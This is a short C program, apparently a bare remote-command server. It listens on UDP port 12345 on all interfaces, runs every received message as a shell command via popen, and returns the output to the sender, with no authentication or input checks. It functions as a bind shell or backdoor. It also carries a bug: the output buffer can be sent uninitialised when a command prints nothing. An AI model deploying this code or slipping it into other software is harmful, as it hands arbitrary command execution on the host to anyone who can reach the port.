#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 12345

void error(const char *msg) {
    perror(msg);
    exit(1);
}

void execute_command(const char *command, char *output) {
    FILE *fp = popen(command, "r");
    if (fp == NULL) {
        strcpy(output, "Error executing command");
        return;
    }

    fgets(output, 1024, fp);
    pclose(fp);
}

int main() {
    int server_socket;
    char buffer[1024];
    struct sockaddr_in server_address, client_address;
    socklen_t client_length = sizeof(client_address);

    // Create socket
    server_socket = socket(AF_INET, SOCK_DGRAM, 0);
    if (server_socket == -1) {
        error("Error creating socket");
    }

    // Initialize server address struct
    memset(&server_address, 0, sizeof(server_address));
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(PORT);

    // Bind the socket
    if (bind(server_socket, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) {
        error("Error binding socket");
    }

    printf("Server listening on port %d...\n", PORT);

    while (1) {
        memset(buffer, 0, sizeof(buffer));

        // Receive data from the client
        recvfrom(server_socket, buffer, sizeof(buffer), 0, (struct sockaddr*)&client_address, &client_length);

        // Check for exit command
        if (strcmp(buffer, "exit") == 0) {
            printf("Server exiting.\n");
            break;
        }

        printf("Received command: %s\n", buffer);

        // Execute the command
        char output[1024];
        execute_command(buffer, output);

        // Send the output back to the client
        sendto(server_socket, output, strlen(output), 0, (struct sockaddr*)&client_address, client_length);
    }

    // Close the socket
    close(server_socket);

    return 0;
}
